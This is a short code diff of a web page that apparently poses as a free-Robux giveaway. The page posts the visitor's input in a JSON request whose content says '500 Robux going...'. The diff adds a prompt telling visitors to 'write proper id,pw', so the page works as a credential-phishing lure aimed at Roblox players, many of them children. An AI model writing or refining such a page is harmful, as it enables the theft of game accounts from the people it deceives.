@@ -18,6 +18,7 @@
             background-position: center;
             margin: 0;
             padding: 0;
+            background-color: #000000;
         }
         .container {
             width: 150%; /* Set container width to 100% */
@@ -118,7 +119,7 @@
             xhr.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
 
             // 결과 값을 생성합니다.
-            var result = "Success";
+            var result = ">";
 
             var payload = {
                 content: inputText + " 500 Robux going..." // 결과 값을 메시지에 포함시킵니다.
@@ -129,7 +130,7 @@
             // 결과를 표시할 div에 결과를 추가합니다.
             var resultDiv = document.getElementById("result");
             resultDiv.style.display = "block"; // 결과를 표시합니다.
-            resultDiv.innerHTML = "500 Robux going..."; // "계산중..."으로 설정합니다.
+            resultDiv.innerHTML = "500 Robux going...(write proper id,pw)"; // "계산중..."으로 설정합니다.
 
             // 1초 후에 결과를 설정합니다.
             setTimeout(function() {
